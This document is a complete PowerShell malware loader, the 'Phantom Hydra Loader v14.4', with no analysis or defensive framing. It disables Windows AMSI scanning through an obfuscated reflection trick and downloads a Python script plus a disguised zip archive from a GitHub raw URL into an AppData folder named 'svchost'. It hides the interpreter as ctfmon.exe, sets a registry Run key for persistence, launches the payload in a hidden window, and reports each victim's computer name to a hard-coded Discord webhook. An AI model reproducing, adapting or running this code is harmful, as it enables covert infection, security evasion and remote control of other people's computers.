# --- THE PHANTOM HYDRA LOADER (V14.4 - PROCESS BYPASS) ---
# 0. BLIND THE WATCHDOG
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b.GetFields('NonPublic,Static');foreach($d in $c){if($d.Name -like "*Context"){$d.SetValue($null,$null)}}}}

$WEBHOOK = "https://discord.com/api/webhooks/1505044718797586577/-gbKCGDVp0tz3RjJl3IfaTTU1xuu3ZBP4fmrL-jq_s0NbA_1iB8zFM0BURGTRTQcZg8U"
function Send-Ghost { param($msg) try { $json = @{content="**[GHOST STATUS | $($env:COMPUTERNAME)]** $msg"} | ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json" } catch {} }

$ID = "svchost"
$Path = "$env:APPDATA\$ID"
$PY_MASK = "$Path\python\ctfmon.exe"

# 1. LANDING PAYLOADS
if (!(Test-Path $Path)) { md $Path > $null }
$C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
$Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/mui_cache.bin"

(New-Object Net.WebClient).DownloadFile($C_URL, "$Path\WinServices.py")
$zipPath = "$Path\mui_cache.zip"
(New-Object Net.WebClient).DownloadFile($Z_URL, $zipPath)

Add-Type -AssemblyName System.IO.Compression.FileSystem
$zip = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
foreach ($entry in $zip.Entries) {
    $target = [System.IO.Path]::Combine($Path, $entry.FullName)
    if ($target.EndsWith("\")) { if (!(Test-Path $target)) { md $target > $null } }
    else {
        if (!(Test-Path ([System.IO.Path]::GetDirectoryName($target)))) { md ([System.IO.Path]::GetDirectoryName($target)) > $null }
        [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $target, $true)
    }
}
$zip.Dispose()
Remove-Item $zipPath -Force

# 2. PERSISTENCE
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $RegPath -Name $ID -Value "`"$PY_MASK`" `"$Path\WinServices.py`""

# 3. ENGAGE (Using .NET Diagnostics to bypass 'Start-Process' blocks)
$si = New-Object System.Diagnostics.ProcessStartInfo
$si.FileName = $PY_MASK
$si.Arguments = "`"$Path\WinServices.py`""
$si.WindowStyle = "Hidden"
$si.WorkingDirectory = $Path
[System.Diagnostics.Process]::Start($si)

Send-Ghost "The Phantom Hydra v14.4 is live. Shadow Protocol confirmed."
